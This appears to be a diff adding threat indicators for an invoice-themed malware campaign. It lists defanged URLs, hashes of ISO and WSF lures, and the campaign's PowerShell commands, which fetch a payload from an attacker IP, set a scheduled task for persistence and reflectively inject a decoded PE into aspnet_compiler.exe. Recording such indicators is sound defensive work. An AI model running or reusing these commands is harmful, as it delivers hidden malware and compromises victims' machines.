@@ -1,0 +1,20 @@
+
+hxxps://gdgosogbo[.]com/ww.php
+
+Invoice#1874369386.iso
+F71B25062981B854E30C15FCB0E07B02
+
+Invoice#1874369386.wsf
+34B97AD647EB34FA4B7EE3DBC500EBF0
+
+hxxp://162.244.210[.]92:333/koko.txt
+
+hxxp://162.244.210[.]92:333/kok.jpg 
+
+Powershell Commands:
+start-bitstransfer -source "hxxp://162.244.210[.]92:333/kok.jpg" -destination "C:\\Users\\Public\\bbbb.zip"
+Expand-Archive -Path 'C:\Users\Public\bbbb.zip' -DestinationPath 'C:\Users\Public'
+Start-BitsTransfer -Source 'https://www.autohotkey.com/download/1.1/AutoHotkey112304_ansi.zip' -Destination 'C:\Users\Public\chrome.zip'
+Start-BitsTransfer -Source 'https://nodejs.org/download/release/latest-v0.12.x/node.exe' -Destination 'C:\Users\Public\node.exe'
+$tr = New-Object -ComObject Schedule.Service; $tr.Connect(); $ta = $tr.NewTask(0); $ta.RegistrationInfo.Description = 'Runs a script every 2 minutes'; $ta.Settings.Enabled = $true; $ta.Settings.DisallowStartIfOnBatteries = $false; $st = $ta.Triggers.Create(1); $st.StartBoundary = [DateTime]::Now.ToString('yyyy-MM-ddTHH:mm:ss'); $st.Repetition.Interval = 'PT2M'; $md = $ta.Actions.Create(0); $md.Path = 'C:\\Users\\Public\\AutoHotkey.exe'; $ns = $tr.GetFolder('\'); $ns.RegisterTaskDefinition('KaR3Em', $ta, 6, $null, $null, 3);
+-Command "function fromHex { param([string] $str)$hex = $str.Split(' '); $result = New-Object 'byte[]' ($hex.Count / 2);$count = 0; for ($i = 0; $i -lt $hex.Count - 1; $i += 2){ $result[$count] = [byte]($hex[$i]); $count++;}return $result };$msg = (Get-Content -Path 'C:\Users\Public\msg.txt');$runpe = (Get-Content -Path 'C:\Users\Public\runpe.txt');$result = fromHex $msg;$runpeD = fromHex $runpe;$new = (Get-Content -Path 'C:\Users\Public\NewPE2.txt');$Execute = (Get-Content -Path 'C:\Users\Public\Execute.txt');$Invoke = (Get-Content -Path 'C:\Users\Public\Invoke.txt');$load = (Get-Content -Path 'C:\Users\Public\load.txt');$ype = (Get-Content -Path 'C:\Users\Public\Gettype.txt');$getM = (Get-Content -Path 'C:\Users\Public\getMethod.txt');[Reflection.Assembly]::$load([Byte[]]$runpeD).$ype($new).$getM($Execute).$Invoke($null,[Object[]]('C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe',$null,[Byte[]]$result,$true)); Stop-Process -Name 'node'""
